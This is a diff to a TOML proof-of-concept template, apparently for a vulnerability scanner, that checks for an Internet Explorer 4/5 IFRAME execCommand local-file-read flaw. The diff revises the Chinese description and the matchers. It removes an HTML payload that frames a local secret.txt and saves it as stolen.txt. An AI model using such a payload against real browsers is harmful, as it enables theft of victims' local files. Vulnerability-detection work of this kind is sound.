@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Internet Explorer 5.0/4.0.1 在处理 IFRAME 元素时，对 ExecCommand 方法的调用缺乏充分同源校验，远程攻击者可通过诱导用户访问恶意网页，在页面嵌入 IFRAME 并调用 ExecCommand 方法读取受害者本地文件。本 PoC 生成一个 HTML 页面，验证目标浏览器是否可被诱导通过 IFRAME 访问本地文件（file://）。"
+description = "检测 Internet Explorer 5/4.01 中 IFRAME 元素上 document.execCommand 方法绕过同源策略读取本地文件的信息泄露漏洞。通过构造包含 IFRAME 和 execCommand 的 HTML 页面，尝试读取本地文件内容以验证漏洞存在。"
 id = "POC-AVE-1999-0670"
-name = "CVE-1999-0877 Internet Explorer IFRAME ExecCommand 本地文件读取 PoC"
+name = "Microsoft Internet Explorer IFRAME ExecCommand 信息泄露 PoC"
 severity = "medium"
 tags = ["ave-1999-0670"]
 vuln_id = [
@@ -15,19 +15,15 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/ie-iframe-execcommand.html"
+path = "/{{BaseURL}}/poc-ie-iframe-exec.html"
 protocol = "http"
-
-[poc.requests.body]
-content = """<html><body><iframe src="file:///C:/WINNT/Profiles/Administrator/desktop/secret.txt"></iframe><script>var f=document.frames[0];f.focus();f.document.execCommand('SaveAs',false,'C:////stolen.txt');</script></body></html>"""
-type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "iframe",
-    "execCommand",
-    "file://",
+    "I1.focus()",
+    "document.execCommand",
+    "file://c:/test.txt",
 ]
